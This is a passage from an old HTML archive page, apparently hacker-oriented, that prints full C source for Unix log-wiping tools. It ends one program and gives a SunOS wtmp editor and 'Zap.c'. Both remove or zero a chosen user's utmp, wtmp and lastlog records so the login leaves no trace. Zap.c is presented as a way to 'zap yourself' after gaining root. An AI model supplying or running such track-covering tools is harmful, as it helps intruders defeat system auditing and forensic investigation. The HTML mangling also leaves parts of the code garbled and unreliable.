nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; size = read( fd,&amp;utmp, sizeof(struct utmp) );<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; if (!x)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbs
p;&nbsp; printf("No entries found.");<BR>&nbsp;&nbsp;&nbsp; else<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf(" entries removed.");<BR>&nbsp;&nbsp;&nbsp; printf("\n");<BR>&nbsp;&nbsp;&nbsp; close(fd);<BR>}<BR><BR>------------- cut here<BR><BR><A NAME="6
"></A><B><FONT SIZE=+1>SunOS wtmp Editor</FONT></B><BR><BR><BR>---------- cut here<BR><BR>/*<BR>&nbsp;&nbsp; /var/adm/wtmp editor for Sun's<BR>&nbsp;&nbsp; Written by gab, this will make a file wtmp.tmp then just copy<BR>&nbsp;&nbsp; it over /var/adm/wtmp
 and chmod 644 it<BR>*/<BR>&nbsp;<BR>#include &lt;stdio.h><BR>#include &lt;utmp.h><BR>#include &lt;fcntl.h><BR>main(argc,argv)<BR>int argc;<BR>char *argv[];<BR>{<BR>int fp=-1,fd=-1;<BR>struct utmp ut;<BR>int i=0;<BR>char name[8];<BR>if (argc!=2) { fprintf
(stderr,"usage: %s accountname\n\r",argv[0]);&nbsp;exit(2);}<BR>strcpy(name,argv[1]);<BR>if (fp=open("/var/adm/wtmp",O_RDONLY)) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fd=open("wtmp.tmp",O_WRONLY|O_CREAT);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n
bsp; while (read(fp,&amp;ut,sizeof(structutmp))==sizeof(struct utmp)) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (strncmp(ut.ut_name,name,strlen(name))) write(fd,&amp;ut,sizeof(structutmp));<BR>&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i++;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(fp);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(fd);<BR>&
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>printf("Total: %d\n\r", i);<BR>}<BR>------------ cut here<BR><BR><A NAME="7"></A><B><FONT SIZE=+1>SunOS 4+ Zap Yourself From wtmp, utmpand lastlog</FONT></B><BR><BR><BR>-------------&nbsp; cut here<BR><BR>/*<
BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Title:&nbsp; Zap.c (c) rokK Industries<BR>&nbsp;&nbsp; Sequence:&nbsp; 911204.B<BR>&nbsp;<BR>&nbsp;&nbsp;&nbsp; Syztems:&nbsp; Kompiles on SunOS 4.+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Note:&nbsp; To mask yourself fro
mlastlog and wtmp you need to be root,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;utmp is go+w on default SunOS, but is sometimes removed.<BR>&nbsp;&nbsp;&nbsp; Kompile:&nbsp; cc -O Zap.c -o Zap<BR>&nbsp;&nbsp;&nbsp;&
nbsp;&nbsp;&nbsp;&nbsp; Run:&nbsp; Zap &lt;Username><BR>&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Desc:&nbsp; Will Fill the Wtmp andUtmp Entries corresponding to the<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ent
ered Username. It also Zeros out the last login data for<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the specific user, fingering that user will show 'Never Logged<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb
sp;&nbsp;&nbsp;&nbsp;&nbsp;In'<BR>&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Usage:&nbsp; If you cant find a usage forthis, get a brain.<BR>*/<BR>&nbsp;<BR>#include &lt;sys/types.h><BR>#include &lt;stdio.h><BR>#include &lt;unistd.h><BR>#include &lt;fcntl.h>
<BR>#include &lt;utmp.h><BR>#include &lt;lastlog.h><BR>#include &lt;pwd.h><BR>&nbsp;<BR>int f;<BR>&nbsp;<BR>void kill_tmp(name,who)<BR>char *name,<BR>&nbsp;&nbsp;&nbsp;&nbsp; *who;<BR>{<BR>&nbsp;&nbsp;&nbsp; struct utmp utmp_ent;<BR>&nbsp;<BR>&nbsp; if ((
f=open(name,O_RDWR))>=0) {<BR>&nbsp;&nbsp;&nbsp;&nbsp; while(read (f, &amp;utmp_ent, sizeof (utmp_ent))>0 )<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!strncmp(utmp_ent.ut_name,who,strlen(who))){<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bzero((char *)&amp;utmp_ent,sizeof( utmp_ent ));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);<BR>&nbsp;&nbsp;&nbsp;&n
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write (f, &amp;utmp_ent, sizeof (utmp_ent));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp; close(f);<BR>&nbsp; }<BR>}<BR>&nbs
p;<BR>void kill_lastlog(who)<BR>char *who;<BR>{<BR>&nbsp;&nbsp;&nbsp; struct passwd *pwd;<BR>&nbsp;&nbsp;&nbsp; struct lastlog newll;<BR>&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp; if ((pwd=getpwnam(who))!=NULL) {<BR>&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&
nbsp; if ((f=open("/usr/adm/lastlog",O_RDWR)) >= 0) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lseek(f,(long)pwd->pw_uid * sizeof (struct lastlog), 0);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bzer
o((char*)&amp;newll,sizeof( newll ));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; write(f,(char *)&amp;newll, sizeof( newll ));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(f);<BR>&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;<BR>&nbsp;&nbsp;&nbsp; } else printf("%s: ?\n",who);<BR>}<BR>&nbsp;<BR>main(argc,argv)<BR>int&nbsp; argc;<BR>char *argv[];<BR>{<BR>&nbsp;&nbsp;&nbsp; if (argc==2) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kill_tmp
("/etc/utmp",argv[1]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kill_tmp("/usr/adm/wtmp",argv[1]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kill_lastlog(argv[1]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("Zap!\n");<BR>&nbsp;&nbsp;&nb
sp; } else<BR>&nbsp;&nbsp;&nbsp; printf("Error.\n");<BR>}<BR>------------ cut here<BR>
<BR>
<BR>
<CENTER><A HREF="http://www.atomicfrog.com/archives/">Back to
Index</a></CENTER>
</BODY>
</HTML>

